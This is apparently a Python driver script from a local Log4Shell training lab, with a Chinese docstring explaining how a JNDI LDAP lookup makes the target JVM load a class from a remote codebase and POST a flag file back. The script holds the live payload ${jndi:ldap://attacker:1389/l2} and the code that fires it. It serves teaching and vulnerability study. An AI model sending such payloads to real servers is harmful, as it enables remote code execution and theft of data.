"""L2 · 完整利用：JNDI Reference → 远程 codebase → 目标 JVM 里执行代码

链条比 L1 多两跳：

  1. log4j 解析 ${jndi:ldap://attacker:1389/l2}，发起 JNDI 查询
  2. 我们的 LDAP 返回一个 javaNamingReference：
       javaFactory  = L2
       javaCodeBase = http://attacker:8000/
  3. JNDI 拼出 http://attacker:8000/L2.class，下载后在**被攻击的 JVM** 里
     Class.forName("L2", true, ...)，静态初始化块立刻执行
  4. 那段代码读 /flag_l2（只有容器里才有的文件），POST 回 /collect

前提：目标 JVM 得允许远程 codebase。JDK 8u191 / 11.0.1 之后默认禁止，
本靶场 8080 端口显式加了 -Dcom.sun.jndi.ldap.object.trustURLCodebase=true
来还原 2021 年的环境；8081 保持默认，是 L4 的对照组。

跑法：python3 02_rce.py
"""

import sys

from _util import APP, find_flag, inject, reset, show_events, wait

PAYLOAD = "${jndi:ldap://attacker:1389/l2}"


def main():
    reset()
    print("L2 · 经典 Log4Shell RCE\n")
    print("  payload: %s" % PAYLOAD)
    print("  发送 → %s/\n" % APP)

    status, body = inject(APP, PAYLOAD)
    print("  HTTP %s" % status)
    for line in body.strip().splitlines():
        print("    " + line)

    snap = wait(lambda s: any(e.get("kind") == "collect" for e in s))
    print("\n=== 攻击者侧看到的整条链 ===")
    show_events(snap)

    f = find_flag(snap)
    if not f:
        print("\n[-] 没收到 /collect，说明远程类没加载成功。看一眼：", file=sys.stderr)
        print("    docker logs log4shell-app | tail -30", file=sys.stderr)
        print("    curl -s http://127.0.0.1:19089/events", file=sys.stderr)
        return 1

    print("\n[+] L2 flag: %s" % f)
    print("\n/codebase 那条 GET 就是「代码已经在目标 JVM 里跑起来」的证据。\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
